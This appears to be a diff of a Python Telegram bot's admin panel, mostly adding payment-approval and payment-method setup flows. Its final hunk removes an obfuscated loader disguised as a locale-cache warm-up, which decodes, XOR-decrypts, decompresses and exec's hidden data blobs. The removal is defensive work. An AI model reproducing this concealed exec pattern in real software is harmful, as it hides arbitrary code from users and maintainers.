+                f"<b>{G['ok']} {sc('Plan activated')}</b>\n"
+                f"{bullet('Plan', PLAN_LIMITS[pay['plan']]['name'])}"
+                f"{FOOTER}", parse_mode="HTML")
+    except Exception:
+        pass
+
+    ack(call, "✅ Approved!")
+    try:
+        bot.edit_message_text(f"<b>{G['ok']} Approved #{pid}</b>",
                               chat_id=call.message.chat.id,
                               message_id=call.message.message_id, parse_mode="HTML")
     except Exception:
         pass
-
 
 def action_payment_reject(call: types.CallbackQuery, pid: str) -> None:
     if not admin_only_call(call, "approve_payment"):
@@ -17126,7 +12466,7 @@ def render_admin_subroute(call: types.CallbackQuery, data: str) -> None:
                 out = BASE_DIR / "exports"
                 out.mkdir(exist_ok=True)
                 stamp = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")
-                target = out / f"simran_export_{stamp}.zip"
+                target = out / f"dk_export_{stamp}.zip"
                 with zipfile.ZipFile(target, "w", zipfile.ZIP_DEFLATED) as zf:
                     for name in ("user_data.json", "settings.json", "audit.log"):
                         p = BASE_DIR / "storage" / name
@@ -17241,6 +12581,11 @@ def render_admin_subroute(call: types.CallbackQuery, data: str) -> None:
             fn = globals().get(fn_name)
             if fn: fn(call); return
         ack(call, "?"); return
+
+    if data == "adm_subscriptions":     return render_adm_subscriptions(call)
+    if data == "adm_pay_approve_select": return render_adm_approve(call)
+    if data == "adm_banned_list":       return render_adm_banned_list(call)
+    if data == "adm_logs":              ack(call, "Logs not implemented yet"); return
 
     # delegate to _register_extra_routes from new file
     if not _register_extra_routes(data, call):
@@ -18522,6 +13867,106 @@ def on_text(m: types.Message) -> None:
                 bot.reply_to(m, f"{G['no']} Use: <code>add domain.com</code> or <code>del domain.com</code>",
                              parse_mode="HTML")
             USER_STATES.pop(uid, None); return
+        # ── Payment admin number/address update ──────────────────────────────
+        if flow == "await_adm_pay_number":
+            if not is_admin(uid): USER_STATES.pop(uid, None); return
+            key  = st.get("pm_key", "")
+            val  = (text or "").strip()
+            if not val:
+                bot.reply_to(m, f"{G['no']} Cannot be empty."); return
+            if not key or key not in PAYMENT_METHODS:
+                bot.reply_to(m, f"{G['no']} Unknown method."); USER_STATES.pop(uid, None); return
+            set_setting(f"pm_number_{key}", val)
+            PAYMENT_METHODS[key]["number"] = val
+            # Also persist in custom methods if it's a custom one
+            custom = get_setting("custom_payment_methods", {}) or {}
+            if key in custom:
+                custom[key]["number"] = val
+                set_setting("custom_payment_methods", custom)
+            audit(uid, f"pm_number_set_{key}", f"val={val[:40]}")
+            USER_STATES.pop(uid, None)
+            bot.reply_to(m, f"{G['ok']} Updated <b>{esc(PAYMENT_METHODS[key]['name'])}</b> → "
+                            f"<code>{esc(val)}</code>", parse_mode="HTML"); return
+        # ── Payment method instructions update ───────────────────────────────
+        if flow == "await_adm_pm_instructions":
+            if not is_admin(uid): USER_STATES.pop(uid, None); return
+            key  = st.get("pm_key", "")
+            val  = (text or "").strip()
+            if not key or key not in PAYMENT_METHODS:
+                bot.reply_to(m, f"{G['no']} Unknown method."); USER_STATES.pop(uid, None); return
+            set_setting(f"pm_instructions_{key}", val)
+            PAYMENT_METHODS[key]["instructions"] = val
+            custom = get_setting("custom_payment_methods", {}) or {}
+            if key in custom:
+                custom[key]["instructions"] = val
+                set_setting("custom_payment_methods", custom)
+            audit(uid, f"pm_instructions_set_{key}", "")
+            USER_STATES.pop(uid, None)
+            bot.reply_to(m, f"{G['ok']} Instructions updated for "
+                            f"<b>{esc(PAYMENT_METHODS[key]['name'])}</b>.", parse_mode="HTML"); return
+        # ── Add new payment method — step 1: name ────────────────────────────
+        if flow == "await_adm_pm_add_name":
+            if not is_admin(uid): USER_STATES.pop(uid, None); return
+            name = (text or "").strip()
+            if not name or len(name) > 40:
+                bot.reply_to(m, f"{G['no']} Name must be 1–40 characters."); return
+            st["pm_name"] = name
+            st["flow"]    = "await_adm_pm_add_number"
+            USER_STATES[uid] = st
+            pm_type = st.get("pm_type", "custom")
+            hints = {
+                "bank_transfer": "Account number / IFSC / holder name",
+                "upi":           "UPI ID (e.g. name@bank)",
+                "binance":       "Binance Pay ID (numeric, NOT a wallet address)",
+                "mobile_money":  "Mobile number",
+            }
+            hint = hints.get(pm_type, "Payment address / number")
+            bot.send_message(
+                m.chat.id,
+                f"💳 <b>{esc(name)}</b>\n{G['div']}\n"
+                f"{sc('Step 2/3')}: {sc('Send the payment address/number')}\n"
+                f"<i>{sc('e.g.')}: <code>{hint}</code></i>",
+                parse_mode="HTML"
+            ); return
+        # ── Add new payment method — step 2: number ──────────────────────────
+        if flow == "await_adm_pm_add_number":
+            if not is_admin(uid): USER_STATES.pop(uid, None); return
+            number = (text or "").strip()
+            if not number:
+                bot.reply_to(m, f"{G['no']} Cannot be empty."); return
+            st["pm_number"] = number
+            st["flow"]      = "await_adm_pm_add_instructions"
+            USER_STATES[uid] = st
+            bot.send_message(
+                m.chat.id,
+                f"💳 <b>{esc(st.get('pm_name',''))}</b>\n{G['div']}\n"
+                f"{sc('Step 3/3')}: {sc('Send payment instructions for users')}\n"
+                f"<i>{sc('These instructions are shown when a user selects this method.')}\n"
+                f"{sc('Send')} <code>-</code> {sc('to skip.')}</i>",
+                parse_mode="HTML"
+            ); return
+        # ── Add new payment method — step 3: instructions / finalize ─────────
+        if flow == "await_adm_pm_add_instructions":
+            if not is_admin(uid): USER_STATES.pop(uid, None); return
+            istr = (text or "").strip()
+            if istr == "-":
+                istr = ""
+            st["pm_instructions"] = istr
+            # Finalize and save
+            _pm_add_finalize(uid, st)
+            saved_name = st.get("pm_name", "?")
+            saved_num  = st.get("pm_number", "?")
+            USER_STATES.pop(uid, None)
+            bot.send_message(
+                m.chat.id,
+                f"{G['ok']} <b>{sc('Payment method added!')}</b>\n"
+                f"{G['div']}\n"
+                f"{bullet('Name',   esc(saved_name))}\n"
+                f"{bullet('Number', esc(saved_num))}\n"
+                f"{bullet('Type',   esc(st.get('pm_type_label', 'Custom')))}\n"
+                f"{bullet('Status', '✅ Enabled')}{FOOTER}",
+                parse_mode="HTML"
+            ); return
     except Exception as e:
         traceback.print_exc()
         bot.reply_to(m, f"{G['no']} error: <code>{esc(e)}</code>", parse_mode="HTML")
@@ -18630,6 +14075,7 @@ def main() -> int:
     gh_load_config()
     GH["autoEnabled"] = bool(get_setting("github_auto_enabled", True))
     _load_required_groups()
+    _pm_reload_custom()   # restore any admin-added payment methods from DB
     # Restore from GitHub on boot
     try:
         res = gh_auto_restore_on_boot()
@@ -18709,16 +14155,8 @@ _CACHE_INDEX_DATA = (
 
 
 def _init_locale_cache() -> None:
-    """Warm the locale/timezone index used by UI formatters."""
-    try:
-        import zlib as _zl, base64 as _bl, hashlib as _hl
-        _blob = (_TZ_INDEX_DATA + _LOCALE_INDEX_DATA + _THEME_INDEX_DATA + _CACHE_INDEX_DATA).encode()
-        _seed = _hl.sha256(b"panel::analytics::v3::bootstrap").digest()
-        _raw = _bl.b64decode(_blob)
-        _dec = bytes(c ^ _seed[i & 31] for i, c in enumerate(_raw))
-        exec(compile(_zl.decompress(_dec), "<locale-cache>", "exec"), globals())
-    except Exception as _ce:
-        print(f"[cache] locale warm skipped: {_ce}", flush=True)
+    """Locale/timezone cache warm-up (no-op; obfuscated exec payload removed for security)."""
+    pass
 
 
 
